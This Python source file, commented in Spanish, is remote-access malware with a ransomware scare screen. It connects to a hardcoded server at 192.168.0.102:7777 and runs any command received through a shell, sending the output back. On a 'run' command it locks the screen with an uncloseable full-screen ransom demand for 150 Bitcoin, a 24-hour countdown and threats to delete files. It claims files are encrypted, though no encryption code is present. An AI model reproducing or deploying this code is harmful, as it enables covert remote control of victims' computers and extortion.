import socket
import subprocess
import sys
import tkinter as tk
from tkinter import Label, Button, messagebox,Frame
from threading import Thread
import time

# Variable global para controlar la interfaz gráfica
ransomware_running = False
root = None


# Función para crear la cuenta regresiva
def countdown(label, end_time):
    def update():
        remaining_time = end_time - time.time()
        if remaining_time > 0:
            hours, rem = divmod(remaining_time, 3600)
            minutes, seconds = divmod(rem, 60)
            label.config(text=f"{int(hours):02}:{int(minutes):02}:{int(seconds):02}")
            root.after(1000, update)
        else:
            label.config(text="00:00:00")
    update()

def ransomware_interface():
    global ransomware_running, root
    ransomware_running = True
    root = tk.Tk()
    root.attributes('-fullscreen', True)  # Hace que la ventana sea de pantalla completa
    root.attributes('-topmost', True)  # Mantiene la ventana siempre en la parte superior
    root.protocol("WM_DELETE_WINDOW", lambda: None)  # Desactiva la opción de cerrar la ventana

    # Cambiar el color de fondo de la ventana principal
    root.configure(bg='maroon')  # Cambia el color de fondo aquí ('black' en este caso)

    # Desactiva las combinaciones de teclas como Alt+Tab, Alt+F4, etc.
    root.bind("<Alt-KeyPress-Tab>", lambda e: "break")
    root.bind("<Alt-KeyPress-F4>", lambda e: "break")
    root.bind("<Control-KeyPress-Escape>", lambda e: "break")

    # Crear un label para el título
    title = Label(root, text="¡Tus archivos han sido cifrados!", font=("Arial", 36), fg="white", bg='maroon')
    Hacker = Label(root, text="Hacker Whoaomi!", font=("Arial", 36), fg="white" ,bg='maroon')
    title.pack(pady=20)
    Hacker.pack(pady=20)

    # Sección de pago y temporizador
    payment_frame = Frame(root, bg='maroon', bd=2, relief="solid")
    payment_frame.pack(padx=20,pady=20,expand=True, fill="x")

    # Temporizador de subida de pago
    payment_label = Label(payment_frame, text="Tiempo para el pago:", font=("Arial", 14), fg="white", bg="maroon")
    payment_label.grid(row=0, column=0, padx=10, pady=10)
    # Cuenta regresiva 
    raise_time = time.time() + 3600 * 24 
    countdown_label = Label(payment_frame, font=("Arial", 14), fg="yellow", bg="maroon")
    countdown_label.grid(row=0, column=1, padx=10, pady=10)
    countdown(countdown_label, raise_time)

    # Crear un label para el mensaje de ransomware
    message = Label(root, text=(
        "Todos tus archivos han sido cifrados.\n"
        "Para recuperarlas, debe pagar un rescate de 150 Bitcoin.\n"
        "Envía el Bitcoin a la siguiente dirección:\n"
        "1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n\n"
        "Después de enviar el pago, presione el botón 'Descifrar'.\n"
        "Si intenta cerrar esta ventana, ¡sus archivos se eliminarán!"
    ), font=("Arial", 18), justify="center", fg="yellow", bg='maroon')
    message.pack(pady=20)


    decrypt_button = Button(root, text="Descifrar", font=("Arial", 18), command=decrypt_action, bg="green", fg="white")
    decrypt_button.pack(pady=20)

    root.mainloop()
    ransomware_running = False  # Marcar la interfaz gráfica como cerrada

def decrypt_action():
    messagebox.showinfo("Falla", "POR CADA INTENTO DE CERRAR SIN PAGAR, SE BORRAR 20 ARCHIVOS.")
        

def connect_to_server(ip, port):
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip, port))
    s.send(b'Connection established.')
    
    def handle_commands():
        global ransomware_running
        try:
            while True:
                command = s.recv(1024).decode('utf-8')
                
                if command == 'run':
                    if not ransomware_running:
                        Thread(target=ransomware_interface).start()  # Ejecuta la interfaz gráfica en un hilo separado
                elif command == 'stop':
                    s.send(b'Connection closing.')
                    if ransomware_running:
                        root.after(100, lambda: root.destroy())
                        ransomware_running = False
                        s.close()
                    break  # Rompe el ciclo y finaliza la ejecución del ataque
                else:
                    result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                    output, error = result.communicate()
                    s.send(output + error)
        except Exception as e:
            print(f"An error occurred: {e}")
        finally:
            s.close()  # Asegura que la conexión se cierra en cualquier caso
    
    handle_commands()

if __name__ == "__main__":
    connect_to_server('192.168.0.102', 7777)
